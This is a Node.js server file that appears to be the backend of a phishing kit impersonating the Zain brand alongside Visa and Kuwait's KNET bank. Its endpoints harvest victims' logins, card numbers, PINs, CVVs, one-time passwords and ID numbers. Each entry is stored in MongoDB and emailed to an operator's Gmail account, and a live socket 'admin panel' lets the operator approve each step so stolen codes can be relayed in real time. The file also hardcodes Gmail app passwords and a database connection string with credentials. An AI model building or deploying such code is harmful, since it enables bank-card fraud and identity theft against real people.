const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const { Order } = require("./models");
const { default: mongoose } = require("mongoose");
const server = require("http").createServer(app);
const PORT = process.env.PORT || 8080;
const io = require("socket.io")(server, { cors: { origin: "*" } });
app.use(express.json());
app.use(cors("*"));
app.use(require("morgan")("dev"));

const emailData = {
  user: "pnusds269@gmail.com",
  pass: "pvjk jert azvw exnr",
  // user: "saudiabsher1990@gmail.com",
  // pass: "qlkg nfnn xaeq fitz",
};

const sendEmail = async (data, type) => {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: emailData.user,
      pass: emailData.pass,
    },
  });
  let htmlContent = "<div>";
  for (const [key, value] of Object.entries(data)) {
    htmlContent += `<p>${key}: ${
      typeof value === "object" ? JSON.stringify(value) : value
    }</p>`;
  }

  return await transporter
    .sendMail({
      from: "Admin Panel",
      to: emailData.user,
      subject: `${
        type === "visa"
          ? "Zain Visa"
          : type === "login" //
          ? "Zain Form "
          : type === "visaOtp" //
          ? "Zain Visa Otp "
          : type === "pin" //
          ? "Zain Visa Pin "
          : type === "Id" //
          ? "Zain Id Number "
          : type === "kynet" //
          ? "Zain Kynet Bank "
          : type === "kynetOtp" //
          ? "Zain Kynet Otp "
          : type === "kynetCvv" //
          ? "Zain Kynet Cvv "
          : "Zain "
      }`,
      html: htmlContent,
    })
    .then((info) => {
      if (info.accepted.length) {
        return true;
      } else {
        return false;
      }
    });
};

app.get("/", (req, res) => res.send("ok"));

app.post("/login", async (req, res) => {
  try {
    await Order.create(req.body).then(
      async (order) =>
        await sendEmail(req.body, "login").then(() =>
          res.status(201).json({ order })
        )
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

// app.post("/password/:id", async (req, res) => {
//   const { id } = req.params;
//   await Order.findByIdAndUpdate(
//     id,
//     {
//       ...req.body,
//       checked: false,
//       userAccept: false,
//     },
//     { new: true }
//   ).then(
//     async (order) =>
//       await sendEmail(req.body, "password").then(() =>
//         res.status(200).json(order)
//       )
//   );
// });

// app.post("/otp/:id", async (req, res) => {
//   const { id } = req.params;
//   await Order.findByIdAndUpdate(id, {
//     otp: req.body.otp,
//     checked: false,
//     otpAccept: false,
//   }).then(
//     async () => await sendEmail(req.body, "otp").then(() => res.sendStatus(200))
//   );
// });

app.get("/order/checked/:id", async (req, res) => {
  try {
    const { id } = req.params;
    await Order.findByIdAndUpdate(id, { checked: true }).then(() =>
      res.sendStatus(200)
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/visa/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    visaAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "visa").then(() => res.sendStatus(200))
  );
});

app.post("/visaOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    visa_otp: req.body.visa_otp,
    checked: false,
    visaOtpAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "visaOtp").then(() => res.sendStatus(200))
  );
});
app.post("/visaPin/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    visa_pin: req.body.visa_pin,
    checked: false,
    visaPinAccept: false,
  }).then(
    async () => await sendEmail(req.body, "pin").then(() => res.sendStatus(200))
  );
});

app.post("/kynet/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    kynetAccept: false,
  },{new:true}).then(async (order) => {
    console.log(order);
    await sendEmail(req.body, "kynet").then(() => res.sendStatus(200));
  });
});

app.post("/kynetOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    kynet_otp: req.body.kynet_otp,
    checked: false,
    kynetOtpAccept: false,
    VisaOtpAccept: true,

  }).then(
    async () =>
      await sendEmail(req.body, "kynetOtp").then(() => res.sendStatus(200))
  );
});
app.post("/kynetCvv/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    kynet_cvv: req.body.kynet_cvv,
    checked: false,
    kynetCVVAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "kynetCvv").then(() => res.sendStatus(200))
  );
});

app.post("/Id/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    ID_numberAccept: false,
  }).then(
    async () => await sendEmail(req.body, "Id").then(() => res.sendStatus(200))
  );
});

app.post("/verify/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    MotslOtp: req.body.MotslOtp,
    checked: false,
    MotslOtpAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "motslOtp").then(() => res.sendStatus(200))
  );
});

app.get(
  "/users",
  async (req, res) => await Order.find().then((users) => res.json(users))
);

io.on("connection", (socket) => {
  console.log("connected");

  socket.on("login", () => io.emit("login"));

  socket.on("visa", (data) => {
    console.log("visa  received", data);
    io.emit("visa", data);
  });
  socket.on("acceptVisa", async (id) => {
    console.log("acceptVisa From Admin", id);
    await Order.findByIdAndUpdate(id, { visaAccept: true });
    io.emit("acceptVisa", id);
  });
  socket.on("declineVisa", async (id) => {
    console.log("declineVisa Form Admin", id);
    await Order.findByIdAndUpdate(id, { visaAccept: true });
    io.emit("declineVisa", id);
  });

  socket.on("visaOtp", (data) => {
    console.log("visaOtp  received", data);
    io.emit("visaOtp", data);
  });

  socket.on("acceptVisaOtp", async (id) => {
    console.log("acceptVisaOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { visaOtpAccept: true });
    io.emit("acceptVisaOtp", id);
  });

  socket.on("declineVisaOtp", async (id) => {
    console.log("declineVisaOtp Form Admin", id);
    await Order.findByIdAndUpdate(id, { visaOtpAccept: true });
    io.emit("declineVisaOtp", id);
  });
  
  socket.on("visaPin", (data) => {
    console.log("visaPin  received", data);
    io.emit("visaPin", data);
  });

  socket.on("acceptVisaPin", async (id) => {
    console.log("acceptVisaPin From Admin", id);
    await Order.findByIdAndUpdate(id, { visaPinAccept: true });
    io.emit("acceptVisaPin", id);
  });

  socket.on("declineVisaPin", async (id) => {
    console.log("declineVisaPin Form Admin", id);
    await Order.findByIdAndUpdate(id, { visaPinAccept: true });
    io.emit("declineVisaPin", id);
  });

  socket.on("kynet", (data) => {
    console.log("kynet  received", data);
    io.emit("kynet", data);
  });

  socket.on("acceptKynet", async (id) => {
    console.log("acceptKynet From Admin", id);
    await Order.findByIdAndUpdate(id, { kynetAccept: true });
    io.emit("acceptKynet", id);
  });

  socket.on("declineKynet", async (id) => {
    console.log("declineKynet Form Admin", id);
    await Order.findByIdAndUpdate(id, { kynetAccept: true });
    io.emit("declineKynet", id);
  });

  socket.on("kynetOtp", (data) => {
    console.log("kynetOtp  received", data);
    io.emit("kynetOtp", data);
  });

  socket.on("acceptKynetOtp", async (id) => {
    console.log("acceptKynetOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { kynetOtpAccept: true });
    io.emit("acceptKynetOtp", id);
  });

  socket.on("declineKynetOtp", async (id) => {
    console.log("declineKynetOtp Form Admin", id);
    await Order.findByIdAndUpdate(id, { kynetOtpAccept: true });
    io.emit("declineKynetOtp", id);
  });



  socket.on("kynetCvv", (data) => {
    console.log("kynetCvv  received", data);
    io.emit("kynetCvv", data);
  });

  socket.on("acceptKynetCvv", async (id) => {
    console.log("acceptKynetCvv From Admin", id);
    await Order.findByIdAndUpdate(id, { kynetCVVAccept: true });
    io.emit("acceptKynetCvv", id);
  });

  socket.on("declineKynetCvv", async (id) => {
    console.log("declineKynetCvv Form Admin", id);
    await Order.findByIdAndUpdate(id, { kynetCVVAccept: true });
    io.emit("declineKynetCvv", id);
  });



  socket.on("Id", (data) => {
    console.log("Id  received", data);
    io.emit("Id", data);
  });

  socket.on("acceptId", async (id) => {
    console.log("acceptId From Admin", id);
    console.log(id);
    io.emit("acceptId", id);
    await Order.findByIdAndUpdate(id, { ID_numberAccept: true });
  });
  socket.on("declineId", async (id) => {
    console.log("declineId Form Admin", id);
    io.emit("declineId", id);
    await Order.findByIdAndUpdate(id, { ID_numberAccept: true });
  });

  socket.on("verify_order", async (data) => {
    console.log("verify_order  received", data);
    await Order.findByIdAndUpdate(data, {
      verify_order: "قيد الانتظار",
      checked: false,
      VerifyOrderAccept: false,
    }).then(() => io.emit("verify_order", data));
  });
  socket.on("acceptVerifyOrder", async (data) => {
    const { id } = data;
    console.log("acceptVerifyOrder From Admin", id);
    await Order.findByIdAndUpdate(id, {
      VerifyOrderAccept: true,
      verify_order: "تم التحقق",
    });
    io.emit("acceptVerifyOrder", data);
  });
  socket.on("declineVerifyOrder", async (id) => {
    console.log("declineVerifyOrder Form Admin", id);
    await Order.findByIdAndUpdate(id, {
      VerifyOrderAccept: true,
      verify_order: "تم الرفض",
    });
    io.emit("declineVerifyOrder", id);
  });
});

// Function to delete orders older than 7 days
const deleteOldOrders = async () => {
  const sevenDaysAgo = new Date();
  sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
  try {
    const result = await Order.deleteMany({ created: { $lt: sevenDaysAgo } });
    console.log(`${result.deletedCount} orders deleted.`);
  } catch (error) {
    console.error("Error deleting old orders:", error);
  }
};

// Function to run daily
const runDailyTask = () => {
  deleteOldOrders();
  setTimeout(runDailyTask, 24 * 60 * 60 * 1000); // Schedule next execution in 24 hours
};

mongoose
  .connect("mongodb+srv://abshr:abshr@abshr.fxznc.mongodb.net/zain")
  .then((conn) =>
    server.listen(PORT, async () => {
      runDailyTask();
      console.log("server running and connected to db" + conn.connection.host);
      // await Order.find({}).then(async (orders) => {
      //   await Promise.resolve(
      //     orders.forEach(async (order) => {
      //       await Order.findByIdAndDelete(order._id);
      //     })
      //   );
      // });
    })
  );
